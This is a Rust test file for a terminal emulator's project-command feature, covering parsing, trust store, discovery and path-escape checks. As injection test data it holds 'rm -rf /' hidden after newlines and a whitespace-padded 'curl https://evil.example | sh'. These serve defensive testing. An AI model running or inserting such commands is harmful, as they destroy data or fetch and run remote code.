//! Window-free tests for custom commands ("workflows"): parsing, project discovery, trust store,
//! palette matching/confirmation, insert/run encoding, cwd escape checks, and control socket rules.

use std::ffi::OsStr;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use cosmic_text::FontSystem;
use serde_json::{json, Value};
use twitty::color::Palette;
use twitty::config::TwittyConfig;
use twitty::control::{MethodCall, Request};
use twitty::layout::{PaneId, Rect};
use twitty::render::scene::context::DrawContext;
use twitty::render::scene::frame::{build_frame, FrameOptions};
use twitty::render::scene::preedit::PreeditState;
use twitty::render::text::ui::UiFont;
use twitty::render::ui_style::UiStyle;
use twitty::render::{CellMetrics, PaneFrame, RowCache};
use twitty::terminal::Terminal;
use twitty::ui::palette::{matches, PaletteCmd, PaletteId, PaletteState};
use twitty::workflows::{
    discover_project_file, encode_insert, parse_project_bytes, resolve_project_cwd,
    resolve_run_cwd, run_shell_argv_for, sha256_hex, trust_confirm_view, CommandMode, ConfirmCmd,
    ControlRunError, ProjectFile, TrustConfirmState, TrustStore, Workflow, WorkflowSet,
    WorkflowSource, WorkflowSpec, MAX_COMMANDS_PER_SOURCE, MAX_COMMAND_CHARS, MAX_NAME_CHARS,
    MAX_PROJECT_FILE_BYTES, MAX_TRUST_ENTRIES,
};
use winit::keyboard::{Key, ModifiersState, NamedKey};

struct TempDir {
    path: PathBuf,
}

impl TempDir {
    fn new(label: &str) -> Self {
        static COUNTER: AtomicU64 = AtomicU64::new(0);
        let id = COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        let path = std::env::temp_dir().join(format!("twitty-workflows-{label}-{pid}-{id}"));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).expect("create temp dir");
        Self { path }
    }

    fn path(&self) -> &Path {
        &self.path
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

fn write_project_commands(project_dir: &Path, content: &str) -> PathBuf {
    let dot_twitty = project_dir.join(".twitty");
    fs::create_dir_all(&dot_twitty).expect("create .twitty dir");
    let file = dot_twitty.join("commands.json");
    fs::write(&file, content).expect("write commands.json");
    file
}

// ---- SHA-256 ----

#[test]
fn sha256_matches_standard_nist_vectors() {
    assert_eq!(
        sha256_hex(b""),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
    assert_eq!(
        sha256_hex(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert_eq!(
        sha256_hex(b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
        "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
    );
}

// ---- Parsing ----

#[test]
fn parses_good_bad_unknown_arabic_and_bounded_entries() {
    let long_name = "a".repeat(MAX_NAME_CHARS + 50);
    let long_cmd = "x".repeat(MAX_COMMAND_CHARS + 50);
    let json = json!({
        "version": 1,
        "unknown_top_level": true,
        "commands": [
            {
                "name": "Run tests",
                "name_ar": "شغّل الاختبارات",
                "command": "cargo test",
                "mode": "run",
                "cwd": "crates/core",
                "description": "Execute unit tests",
                "extra_ignored": 123
            },
            {
                "name": "Default insert",
                "command": "git status"
            },
            {
                "name": "   ",
                "command": "echo bad empty name"
            },
            {
                "name": "Missing command"
            },
            {
                "name": "Bad mode",
                "command": "ls",
                "mode": "exec"
            },
            {
                "name": "Control cwd",
                "command": "ls",
                "cwd": "foo\nbar"
            },
            "not-an-object",
            {
                "name": format!("\x1b[31m\u{202e}{long_name}"),
                "name_ar": "أمر\u{202e}\x07 عربي",
                "command": format!("{long_cmd}\nrm -rf /")
            }
        ]
    });
    let bytes = serde_json::to_vec(&json).unwrap();
    let parsed = parse_project_bytes(&bytes, "test.json").expect("parse succeeds");
    assert_eq!(parsed.len(), 3, "only the 3 valid entries survive");

    assert_eq!(parsed[0].name, "Run tests");
    assert_eq!(parsed[0].name_ar, "شغّل الاختبارات");
    assert_eq!(parsed[0].command, "cargo test");
    assert_eq!(parsed[0].mode, CommandMode::Run);
    assert_eq!(parsed[0].cwd.as_deref(), Some("crates/core"));
    assert_eq!(parsed[0].description.as_deref(), Some("Execute unit tests"));

    assert_eq!(parsed[1].name, "Default insert");
    assert_eq!(parsed[1].name_ar, "");
    assert_eq!(parsed[1].mode, CommandMode::Insert);

    assert_eq!(parsed[2].name.chars().count(), MAX_NAME_CHARS);
    assert!(!parsed[2].name.contains('\x1b'));
    assert!(!parsed[2].name.contains('\u{202e}'));
    assert_eq!(parsed[2].name_ar, "أمر عربي");
    assert_eq!(parsed[2].command.chars().count(), MAX_COMMAND_CHARS);
    assert!(!parsed[2].command.contains('\n'));
}

#[test]
fn parses_top_level_array_and_caps_at_100_entries() {
    let entries: Vec<Value> = (0..125)
        .map(|i| json!({ "name": format!("Cmd {i}"), "command": format!("echo {i}") }))
        .collect();
    let bytes = serde_json::to_vec(&entries).unwrap();
    let parsed = parse_project_bytes(&bytes, "array.json").unwrap();
    assert_eq!(parsed.len(), MAX_COMMANDS_PER_SOURCE);
    assert_eq!(parsed[0].name, "Cmd 0");
    assert_eq!(parsed[99].name, "Cmd 99");
}

#[test]
fn config_loads_and_saves_user_commands_skipping_bad_entries() {
    let tmp = TempDir::new("config");
    let cfg_path = tmp.path().join("config.json");
    let raw = r#"{
        "font_size": 16,
        "commands": [
            { "name": "Deploy", "name_ar": "نشر", "command": "make deploy", "mode": "insert", "extra": true },
            { "name": "", "command": "bad" },
            { "name": "Bad mode", "command": "echo hi", "mode": "nope" },
            { "name": "Build", "command": "cargo build", "mode": "run" }
        ]
    }"#;
    fs::write(&cfg_path, raw).unwrap();

    let cfg = TwittyConfig::load_from(&cfg_path);
    assert_eq!(cfg.font_size, 16.0);
    assert_eq!(cfg.commands.len(), 2);
    assert_eq!(cfg.commands[0].name, "Deploy");
    assert_eq!(cfg.commands[0].name_ar, "نشر");
    assert_eq!(cfg.commands[0].mode, CommandMode::Insert);
    assert_eq!(cfg.commands[1].name, "Build");
    assert_eq!(cfg.commands[1].mode, CommandMode::Run);

    let out_path = tmp.path().join("saved.json");
    cfg.save_to(&out_path).unwrap();
    let reloaded = TwittyConfig::load_from(&out_path);
    assert_eq!(reloaded.commands, cfg.commands);

    // Invalid non-array `commands` does not discard the rest of config.json.
    let bad_path = tmp.path().join("bad-commands.json");
    fs::write(&bad_path, r#"{ "font_size": 18, "commands": "wrong" }"#).unwrap();
    let bad_cfg = TwittyConfig::load_from(&bad_path);
    assert_eq!(bad_cfg.font_size, 18.0);
    assert!(bad_cfg.commands.is_empty());
}

// ---- Discovery walk ----

#[test]
fn discovery_walks_up_and_picks_nearest_project_including_arabic_dir() {
    let tmp = TempDir::new("discover-basic");
    let home = tmp.path().join("home");
    let outer = home.join("workspace");
    let inner = outer.join("مشروع-عربي");
    let deep = inner.join("src").join("nested");
    fs::create_dir_all(&deep).unwrap();

    write_project_commands(&outer, r#"[{"name": "Outer", "command": "echo outer"}]"#);
    write_project_commands(
        &inner,
        r#"[{"name": "Inner", "name_ar": "داخلي", "command": "echo inner"}]"#,
    );

    let found = discover_project_file(&deep, Some(&home)).expect("should discover inner project");
    assert_eq!(found.root, fs::canonicalize(&inner).unwrap());
    assert_eq!(found.tag, "مشروع-عربي");
    assert_eq!(found.commands.len(), 1);
    assert_eq!(found.commands[0].name, "Inner");
}

#[test]
fn discovery_stops_at_home_ceiling() {
    let tmp = TempDir::new("discover-home");
    let above_home = tmp.path();
    let home = above_home.join("user-home");
    let sub = home.join("work").join("repo");
    fs::create_dir_all(&sub).unwrap();

    // File above $HOME must never be found.
    write_project_commands(
        above_home,
        r#"[{"name": "Above", "command": "echo above"}]"#,
    );
    assert!(discover_project_file(&sub, Some(&home)).is_none());

    // File at $HOME itself is also not treated as a project (user commands live in config.json).
    write_project_commands(&home, r#"[{"name": "AtHome", "command": "echo home"}]"#);
    assert!(discover_project_file(&sub, Some(&home)).is_none());

    // File below $HOME IS found.
    write_project_commands(
        &home.join("work"),
        r#"[{"name": "Work", "command": "echo work"}]"#,
    );
    let found = discover_project_file(&sub, Some(&home)).expect("project below home found");
    assert_eq!(found.commands[0].name, "Work");
}

#[test]
fn discovery_stops_at_32_levels() {
    let tmp = TempDir::new("discover-depth");
    let root = tmp.path().join("root");
    fs::create_dir_all(&root).unwrap();
    write_project_commands(&root, r#"[{"name": "RootCmd", "command": "echo root"}]"#);

    // Build a chain of 33 nested subdirectories below `root`.
    let mut cur = root.clone();
    let mut dirs = vec![root.clone()];
    for i in 1..=33 {
        cur = cur.join(format!("d{i}"));
        fs::create_dir(&cur).unwrap();
        dirs.push(cur.clone());
    }

    // At d31, ancestors().take(32) visits d31..d0 (32 dirs), reaching `root` (d0).
    let found = discover_project_file(&dirs[31], None);
    assert!(found.is_some(), "32nd level (31 steps up) must be found");

    // At d32, ancestors().take(32) visits d32..d1 (32 dirs) and stops before `root` (d0).
    let too_deep = discover_project_file(&dirs[32], None);
    assert!(
        too_deep.is_none(),
        "33rd level (32 steps up) must not be reached"
    );
}

#[test]
fn discovery_refuses_oversized_and_non_regular_files() {
    let tmp = TempDir::new("discover-refuse");

    // Oversized (> 64 KiB).
    let big_proj = tmp.path().join("big");
    fs::create_dir_all(&big_proj).unwrap();
    let pad = " ".repeat(MAX_PROJECT_FILE_BYTES + 16);
    write_project_commands(
        &big_proj,
        &format!(r#"[{{"name":"Big","command":"echo hi"}}]{pad}"#),
    );
    assert!(discover_project_file(&big_proj, None).is_none());

    // Non-regular file (directory named `commands.json`).
    let dir_proj = tmp.path().join("nonreg");
    fs::create_dir_all(dir_proj.join(".twitty").join("commands.json")).unwrap();
    assert!(discover_project_file(&dir_proj, None).is_none());
}

#[cfg(unix)]
#[test]
fn discovery_refuses_symlinked_file_and_symlinked_dir() {
    use std::os::unix::fs::symlink;

    let tmp = TempDir::new("discover-symlink");
    let parent = tmp.path().join("parent");
    let child = parent.join("child");
    fs::create_dir_all(child.join(".twitty")).unwrap();

    // Put a valid commands file in parent to verify refusal also stops the walk (no fallthrough).
    write_project_commands(&parent, r#"[{"name": "Parent", "command": "echo parent"}]"#);

    let real_file = tmp.path().join("real.json");
    fs::write(&real_file, r#"[{"name": "Evil", "command": "echo evil"}]"#).unwrap();
    symlink(&real_file, child.join(".twitty").join("commands.json")).unwrap();

    assert!(
        discover_project_file(&child, None).is_none(),
        "symlinked commands.json must be refused without falling through to parent"
    );

    // Symlinked `.twitty` directory is also refused.
    let child2 = parent.join("child2");
    fs::create_dir_all(&child2).unwrap();
    let real_dot = tmp.path().join("real-dot");
    fs::create_dir_all(&real_dot).unwrap();
    fs::write(
        real_dot.join("commands.json"),
        r#"[{"name": "Evil2", "command": "echo evil2"}]"#,
    )
    .unwrap();
    symlink(&real_dot, child2.join(".twitty")).unwrap();
    assert!(discover_project_file(&child2, None).is_none());
}

// ---- Trust store ----

#[test]
fn trust_path_respects_xdg_state_home_and_fallback() {
    let (xdg_dir, home_dir) = if cfg!(windows) {
        (r"C:\var\state", r"C:\Users\u")
    } else {
        ("/var/state", "/home/u")
    };
    let expected_xdg = PathBuf::from(xdg_dir).join("twitty").join("trust.json");
    let expected_home = PathBuf::from(home_dir)
        .join(".local")
        .join("state")
        .join("twitty")
        .join("trust.json");

    let xdg = TrustStore::path_from(Some(OsStr::new(xdg_dir)), Some(OsStr::new(home_dir)));
    assert_eq!(xdg, Some(expected_xdg));

    let fallback = TrustStore::path_from(None, Some(OsStr::new(home_dir)));
    assert_eq!(fallback, Some(expected_home.clone()));

    let empty_xdg = TrustStore::path_from(Some(OsStr::new("")), Some(OsStr::new(home_dir)));
    assert_eq!(empty_xdg, Some(expected_home));
}

#[test]
fn trust_is_keyed_by_path_and_content_and_edit_untrusts() {
    let tmp = TempDir::new("trust-edit");
    let proj = tmp.path().join("repo");
    fs::create_dir_all(&proj).unwrap();
    let cmd_file = write_project_commands(&proj, r#"[{"name":"Test","command":"cargo test"}]"#);
    let store_path = tmp.path().join("state").join("twitty").join("trust.json");

    let discovered1 = discover_project_file(&proj, None).unwrap();
    let mut store = TrustStore::load_from(&store_path);
    assert!(!store.is_trusted(&discovered1.root, &discovered1.sha256));

    assert!(store.trust(&discovered1.root, &discovered1.sha256));
    store.save_to(&store_path).unwrap();

    let reloaded = TrustStore::load_from(&store_path);
    assert!(reloaded.is_trusted(&discovered1.root, &discovered1.sha256));

    // Different directory with identical content is NOT trusted.
    let other_proj = tmp.path().join("other-repo");
    fs::create_dir_all(&other_proj).unwrap();
    write_project_commands(&other_proj, r#"[{"name":"Test","command":"cargo test"}]"#);
    let discovered_other = discover_project_file(&other_proj, None).unwrap();
    assert_eq!(discovered_other.sha256, discovered1.sha256);
    assert!(!reloaded.is_trusted(&discovered_other.root, &discovered_other.sha256));

    // Editing the file changes its SHA-256 and immediately un-trusts it.
    fs::write(
        &cmd_file,
        r#"[{"name":"Test","command":"cargo test --all"}]"#,
    )
    .unwrap();
    let discovered2 = discover_project_file(&proj, None).unwrap();
    assert_ne!(discovered2.sha256, discovered1.sha256);
    assert!(!reloaded.is_trusted(&discovered2.root, &discovered2.sha256));
}

#[test]
fn trust_store_bounds_to_500_dropping_oldest() {
    let tmp = TempDir::new("trust-bound");
    let store_path = tmp.path().join("twitty").join("trust.json");
    let mut store = TrustStore::default();
    let total = MAX_TRUST_ENTRIES + 25;
    for i in 0..total {
        let dir = PathBuf::from(format!("/projects/p{i}"));
        let hash = sha256_hex(format!("content-{i}").as_bytes());
        assert!(store.trust(&dir, &hash));
    }
    assert_eq!(store.len(), MAX_TRUST_ENTRIES);
    // Oldest 25 (0..25) were dropped; newest 500 (25..525) remain.
    assert!(!store.is_trusted(Path::new("/projects/p0"), &sha256_hex(b"content-0")));
    assert!(!store.is_trusted(Path::new("/projects/p24"), &sha256_hex(b"content-24")));
    assert!(store.is_trusted(Path::new("/projects/p25"), &sha256_hex(b"content-25")));
    assert!(store.is_trusted(
        Path::new(&format!("/projects/p{}", total - 1)),
        &sha256_hex(format!("content-{}", total - 1).as_bytes())
    ));

    store.save_to(&store_path).unwrap();
    let loaded = TrustStore::load_from(&store_path);
    assert_eq!(loaded.len(), MAX_TRUST_ENTRIES);
    assert!(!loaded.is_trusted(Path::new("/projects/p0"), &sha256_hex(b"content-0")));
    assert!(loaded.is_trusted(Path::new("/projects/p25"), &sha256_hex(b"content-25")));
}

#[cfg(unix)]
#[test]
fn trust_store_enforces_modes_and_refuses_symlinks() {
    use std::os::unix::fs::{symlink, PermissionsExt};

    let tmp = TempDir::new("trust-unix");
    let state_dir = tmp.path().join("state").join("twitty");
    let store_path = state_dir.join("trust.json");

    let mut store = TrustStore::default();
    let hash = sha256_hex(b"ok");
    store.trust(Path::new("/repo/a"), &hash);
    store.save_to(&store_path).unwrap();

    let dir_mode = fs::symlink_metadata(&state_dir)
        .unwrap()
        .permissions()
        .mode()
        & 0o777;
    let file_mode = fs::symlink_metadata(&store_path)
        .unwrap()
        .permissions()
        .mode()
        & 0o777;
    assert_eq!(dir_mode, 0o700, "state dir must be 0700");
    assert_eq!(file_mode, 0o600, "trust.json must be 0600");

    // Symlinked trust file must be refused on load (nothing trusted) and save (error, target untouched).
    let link_dir = tmp.path().join("link-state").join("twitty");
    fs::create_dir_all(&link_dir).unwrap();
    let real_target = tmp.path().join("real-trust.json");
    fs::copy(&store_path, &real_target).unwrap();
    let link_path = link_dir.join("trust.json");
    symlink(&real_target, &link_path).unwrap();

    let loaded = TrustStore::load_from(&link_path);
    assert!(loaded.is_empty(), "symlinked trust.json must trust nothing");
    let err = store.save_to(&link_path).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied);
}

#[test]
fn corrupt_trust_store_trusts_nothing() {
    let tmp = TempDir::new("trust-corrupt");
    let hash = sha256_hex(b"anything");

    for (name, body) in [
        ("invalid-json.json", "{ not json"),
        (
            "wrong-version.json",
            &format!(
                r#"{{"version": 99, "entries": [{{"dir": "/repo", "sha256": "{hash}", "trusted_at": 1}}]}}"#
            ),
        ),
        (
            "bad-hash.json",
            r#"{"version": 1, "entries": [{"dir": "/repo", "sha256": "not-a-sha256", "trusted_at": 1}]}"#,
        ),
    ] {
        let p = tmp.path().join(name);
        fs::write(&p, body).unwrap();
        let store = TrustStore::load_from(&p);
        assert!(store.is_empty(), "{name} must yield empty trust store");
        assert!(!store.is_trusted(Path::new("/repo"), &hash));
    }
}

// ---- Palette matching & trust confirmation ----

#[test]
fn palette_matches_custom_entries_in_arabic_and_english_with_tags() {
    let user = vec![WorkflowSpec {
        name: "Deploy staging".into(),
        name_ar: "نشر للتجربة".into(),
        command: "make deploy-staging".into(),
        mode: CommandMode::Insert,
        cwd: None,
        description: Some("Push to staging".into()),
    }];
    let project = ProjectFile {
        root: PathBuf::from("/work/my-app"),
        tag: "my-app".into(),
        sha256: sha256_hex(b"proj"),
        commands: vec![WorkflowSpec {
            name: "Run tests".into(),
            name_ar: "شغّل الاختبارات".into(),
            command: "cargo test".into(),
            mode: CommandMode::Run,
            cwd: None,
            description: None,
        }],
    };

    // Untrusted project file.
    let set = WorkflowSet::from_parts(&user, Some(project.clone()), &TrustStore::default());
    let entries = set.palette_entries();

    // English match finds custom project entry and shows untrusted mark + project tag.
    let hits = matches(&entries, "run tests");
    let first = &entries[hits[0]];
    assert!(matches!(first.id, PaletteId::Custom(1)));
    assert_eq!(first.shortcut.as_deref(), Some("⚠ [my-app]"));

    // Arabic match without tashkeel / with hamza folding finds both user & project commands.
    let ar_proj = matches(&entries, "شغل الاختبارات");
    assert_eq!(entries[ar_proj[0]].title_en, "Run tests");

    let ar_user = matches(&entries, "نشر للتجربه");
    assert_eq!(entries[ar_user[0]].title_en, "Deploy staging");
    assert_eq!(entries[ar_user[0]].shortcut, None);

    // Selecting with Enter returns PaletteCmd::Run(PaletteId::Custom(_)).
    let mut state = PaletteState::default();
    state.push_text("run tests");
    assert_eq!(
        state.key(
            &entries,
            &Key::Named(NamedKey::Enter),
            None,
            ModifiersState::empty()
        ),
        PaletteCmd::Run(PaletteId::Custom(1))
    );

    // Once trusted, the ⚠ mark disappears while the [my-app] tag stays.
    let mut trust = TrustStore::default();
    trust.trust(&project.root, &project.sha256);
    let trusted_set = WorkflowSet::from_parts(&user, Some(project), &trust);
    let trusted_entries = trusted_set.palette_entries();
    let hits = matches(&trusted_entries, "run tests");
    assert_eq!(
        trusted_entries[hits[0]].shortcut.as_deref(),
        Some("[my-app]")
    );
}

#[test]
fn trust_confirmation_shows_bilingual_prompt_and_full_command_list_and_renders() {
    let project = ProjectFile {
        root: PathBuf::from("/work/مشروع"),
        tag: "مشروع".into(),
        sha256: sha256_hex(b"proj"),
        commands: vec![
            WorkflowSpec {
                name: "Test".into(),
                name_ar: "اختبار".into(),
                command: "cargo test".into(),
                mode: CommandMode::Run,
                cwd: Some("api".into()),
                description: None,
            },
            WorkflowSpec {
                name: "Format".into(),
                name_ar: "تنسيق".into(),
                command: "cargo fmt".into(),
                mode: CommandMode::Insert,
                cwd: None,
                description: None,
            },
        ],
    };

    let view = trust_confirm_view(&project, 0);
    assert_eq!(view.selected, 0);
    // Confirmation item, then per command a header row and the command on its own row(s).
    assert_eq!(view.items.len(), 5);
    assert_eq!(view.items[0].title_en, "Trust commands in مشروع?");
    assert_eq!(view.items[0].title_ar, "هل تثق في أوامر مشروع؟");
    assert!(view.items[1].title_en.contains("Test"));
    assert!(view.items[1].title_en.contains("api"));
    assert!(view.items[2].title_en.contains("cargo test"));
    assert!(view.items[4].title_en.contains("cargo fmt"));

    // State machine: Up/Down scroll, Enter trusts, Esc cancels.
    let mut confirm = TrustConfirmState::default();
    assert_eq!(
        confirm.key(&Key::Named(NamedKey::ArrowDown), 2),
        ConfirmCmd::None
    );
    assert_eq!(confirm.scroll, 1);
    assert_eq!(
        confirm.key(&Key::Named(NamedKey::ArrowUp), 2),
        ConfirmCmd::None
    );
    assert_eq!(confirm.scroll, 0);
    assert_eq!(
        confirm.key(&Key::Named(NamedKey::Escape), 2),
        ConfirmCmd::Cancel
    );
    assert_eq!(
        confirm.key(&Key::Named(NamedKey::Enter), 2),
        ConfirmCmd::Trust
    );

    // Headless render test: confirmation overlay draws cleanly with Arabic text.
    let mut font_system = FontSystem::new();
    let palette = Palette::default();
    let metrics = CellMetrics {
        font_size: 15.0,
        scale: 1.0,
        char_width: 9.0,
        line_height: 23.0,
        padding_left: 8.0,
        padding_top: 6.0,
    };
    let mut ctx = DrawContext {
        font_system: &mut font_system,
        family: None,
        palette: &palette,
        metrics,
        is_srgb: false,
    };
    let surface = (900.0, 600.0);
    let opts = FrameOptions {
        window_focused: true,
        cursor_style: "block",
        cursor_blink_on: true,
        surface,
    };
    let term = Terminal::new(40, 4, |_| {});
    let (lines, cursor) = term.snapshot();
    let panes = vec![PaneFrame {
        id: PaneId(1),
        rect: Rect::new(0.0, 0.0, surface.0, surface.1),
        lines,
        cursor,
        focused: true,
        status: None,
        blocks: Vec::new(),
    }];
    let mut cache = RowCache::default();
    let mut ime = PreeditState::default();
    let mut frame = build_frame(&mut ctx, &opts, &mut cache, &mut ime, &[], &panes, &[]);
    frame.add_palette(
        &mut ctx,
        UiStyle::new(&palette, None, metrics.scale),
        &UiFont::default(),
        &view,
    );
    assert!(!frame.text_runs(&panes, &cache, &ime).is_empty());
}

// ---- Insert encoding & run execution helpers ----

#[test]
fn insert_encoding_has_no_newline_and_respects_bracketed_paste() {
    let plain = encode_insert("cargo test\nrm -rf /\r", false);
    assert_eq!(plain, b"cargo testrm -rf /");
    assert!(!plain.contains(&b'\n'));
    assert!(!plain.contains(&b'\r'));

    let bracketed = encode_insert("cargo test\x1b[201~evil\n", true);
    assert!(bracketed.starts_with(b"\x1b[200~"));
    assert!(bracketed.ends_with(b"\x1b[201~"));
    let inner = &bracketed[6..bracketed.len() - 6];
    assert!(!inner.contains(&b'\x1b'));
    assert!(!inner.contains(&b'\n'));
    assert!(!inner.contains(&b'\r'));
    assert_eq!(inner, b"cargo test[201~evil");
}

#[test]
fn run_shell_argv_invokes_shell_dash_c() {
    assert_eq!(
        run_shell_argv_for("/bin/zsh", &[], "cargo test && echo ok"),
        vec!["/bin/zsh", "-c", "cargo test && echo ok"]
    );
    assert_eq!(
        run_shell_argv_for("bash", &["--norc".into()], "ls"),
        vec!["bash", "--norc", "-c", "ls"]
    );
}

#[test]
fn project_cwd_allows_subdirectories_and_refuses_escapes() {
    let tmp = TempDir::new("cwd-escape");
    let root = tmp.path().join("project");
    let subdir = root.join("packages").join("app");
    let outside = tmp.path().join("outside");
    fs::create_dir_all(&subdir).unwrap();
    fs::create_dir_all(&outside).unwrap();

    // Valid relative subdir inside project root.
    let resolved = resolve_project_cwd(&root, "packages/app").expect("subdir allowed");
    assert_eq!(resolved, fs::canonicalize(&subdir).unwrap());

    // `.` resolves to canonical project root.
    assert_eq!(
        resolve_project_cwd(&root, ".").unwrap(),
        fs::canonicalize(&root).unwrap()
    );

    // `..` escape refused.
    assert!(resolve_project_cwd(&root, "../outside").is_err());
    assert!(resolve_project_cwd(&root, "packages/../../outside").is_err());

    // Absolute path refused even if it points inside project root.
    assert!(resolve_project_cwd(&root, subdir.to_str().unwrap()).is_err());
    assert!(resolve_project_cwd(&root, "/").is_err());

    // Missing path refused.
    assert!(resolve_project_cwd(&root, "does/not/exist").is_err());

    // Symlink inside project pointing outside root refused.
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(&outside, root.join("escape-link")).unwrap();
        assert!(
            resolve_project_cwd(&root, "escape-link").is_err(),
            "symlink escaping project root must be refused"
        );
    }

    // Omitted cwd falls back to pane cwd.
    let wf = Workflow {
        spec: WorkflowSpec {
            name: "Run".into(),
            name_ar: String::new(),
            command: "echo hi".into(),
            mode: CommandMode::Run,
            cwd: None,
            description: None,
        },
        source: WorkflowSource::Project {
            root: fs::canonicalize(&root).unwrap(),
            tag: "project".into(),
            sha256: sha256_hex(b"x"),
        },
        trusted: true,
    };
    assert_eq!(resolve_run_cwd(&wf, Some(&subdir)).unwrap(), Some(subdir));
}

// ---- Control socket integration rules ----

#[test]
fn control_lists_custom_commands_and_refuses_untrusted() {
    let user = vec![WorkflowSpec {
        name: "UserBuild".into(),
        name_ar: "بناء".into(),
        command: "cargo build".into(),
        mode: CommandMode::Run,
        cwd: None,
        description: None,
    }];
    let project = ProjectFile {
        root: PathBuf::from("/work/repo"),
        tag: "repo".into(),
        sha256: sha256_hex(b"repo-cmds"),
        commands: vec![
            WorkflowSpec {
                name: "RepoTest".into(),
                name_ar: "اختبار".into(),
                command: "cargo test".into(),
                mode: CommandMode::Run,
                cwd: None,
                description: None,
            },
            // Same name as user command: untrusted repo must not shadow user command.
            WorkflowSpec {
                name: "UserBuild".into(),
                name_ar: String::new(),
                command: "echo evil".into(),
                mode: CommandMode::Run,
                cwd: None,
                description: None,
            },
        ],
    };

    let untrusted_set =
        WorkflowSet::from_parts(&user, Some(project.clone()), &TrustStore::default());

    // `command.list` includes builtins + user + project with name, source, trusted.
    let listed = untrusted_set.control_list_json();
    let builtin = listed.iter().find(|v| v["name"] == "split.right").unwrap();
    assert_eq!(builtin["source"], "builtin");
    assert_eq!(builtin["trusted"], true);

    let user_item = listed
        .iter()
        .find(|v| v["name"] == "UserBuild" && v["source"] == "user")
        .unwrap();
    assert_eq!(user_item["trusted"], true);

    let proj_item = listed
        .iter()
        .find(|v| v["name"] == "RepoTest" && v["source"] == "project")
        .unwrap();
    assert_eq!(proj_item["trusted"], false);

    // Control run: user command succeeds (and is NOT shadowed by untrusted project command).
    let resolved_user = untrusted_set.resolve_control_run("UserBuild").unwrap();
    assert_eq!(resolved_user.source, WorkflowSource::User);
    assert_eq!(resolved_user.spec.command, "cargo build");

    // Control run: untrusted project command is strictly refused.
    assert_eq!(
        untrusted_set.resolve_control_run("RepoTest"),
        Err(ControlRunError::Untrusted("RepoTest".into()))
    );

    // Unknown command returns NotFound.
    assert_eq!(
        untrusted_set.resolve_control_run("NoSuchCmd"),
        Err(ControlRunError::NotFound("NoSuchCmd".into()))
    );

    // No control method exists to trust a project file.
    for method in ["command.trust", "workflow.trust", "trust.add"] {
        let req = Request {
            id: json!(1),
            method: method.into(),
            params: json!({}),
        };
        assert!(
            MethodCall::parse(&req).is_err(),
            "control socket must never expose {method}"
        );
    }

    // Once trusted via the trust store, `command.run` allows the project command.
    let mut trust = TrustStore::default();
    trust.trust(&project.root, &project.sha256);
    let trusted_set = WorkflowSet::from_parts(&user, Some(project), &trust);
    let resolved_proj = trusted_set.resolve_control_run("RepoTest").unwrap();
    assert!(resolved_proj.trusted);
    assert_eq!(resolved_proj.spec.command, "cargo test");
}

#[test]
fn trust_confirmation_never_hides_the_end_of_a_padded_or_long_command() {
    use twitty::workflows::{confirm_rows, CONFIRM_ROW_CHARS};

    // Padding meant to push the dangerous part past the edge of the row is collapsed.
    let padded = format!(
        "make test{}; curl https://evil.example | sh",
        " ".repeat(500)
    );
    let rows = confirm_rows(&padded);
    assert_eq!(rows.join(""), "make test ; curl https://evil.example | sh");

    // A long command continues on more rows, nothing dropped, each row bounded.
    let long = "x".repeat(CONFIRM_ROW_CHARS * 2 + 5);
    let rows = confirm_rows(&long);
    assert_eq!(rows.len(), 3);
    assert!(rows.iter().all(|r| r.chars().count() <= CONFIRM_ROW_CHARS));
    assert_eq!(rows.concat(), long);
}
